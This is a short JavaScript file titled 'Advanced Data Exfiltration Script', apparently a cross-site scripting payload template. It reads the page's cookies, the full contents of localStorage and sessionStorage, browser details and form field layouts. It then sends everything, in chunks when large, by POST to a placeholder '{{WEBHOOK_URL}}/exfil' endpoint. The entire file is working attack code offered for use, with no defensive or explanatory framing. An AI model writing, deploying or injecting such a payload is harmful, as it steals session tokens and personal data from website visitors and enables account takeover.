// Advanced Data Exfiltration Script
(function() {
    // Collect comprehensive data
    const data = {
        // Page info
        url: window.location.href,
        title: document.title,
        referrer: document.referrer,

        // User data
        cookies: document.cookie,
        localStorage: Object.keys(localStorage).reduce((acc, key) => {
            acc[key] = localStorage.getItem(key);
            return acc;
        }, {}),
        sessionStorage: Object.keys(sessionStorage).reduce((acc, key) => {
            acc[key] = sessionStorage.getItem(key);
            return acc;
        }, {}),

        // Browser info
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,

        // DOM info
        forms: Array.from(document.forms).map(f => ({
            action: f.action,
            method: f.method,
            fields: Array.from(f.elements).map(e => ({
                name: e.name,
                type: e.type
            }))
        })),

        // Timestamp
        timestamp: new Date().toISOString()
    };

    // Send data in chunks if too large
    const dataStr = JSON.stringify(data);
    const chunkSize = 50000; // 50KB chunks

    if (dataStr.length > chunkSize) {
        const chunks = Math.ceil(dataStr.length / chunkSize);
        for (let i = 0; i < chunks; i++) {
            const chunk = dataStr.slice(i * chunkSize, (i + 1) * chunkSize);
            fetch('{{WEBHOOK_URL}}/exfil', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chunk: i + 1,
                    total: chunks,
                    data: chunk
                })
            });
        }
    } else {
        fetch('{{WEBHOOK_URL}}/exfil', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: dataStr
        });
    }
})();
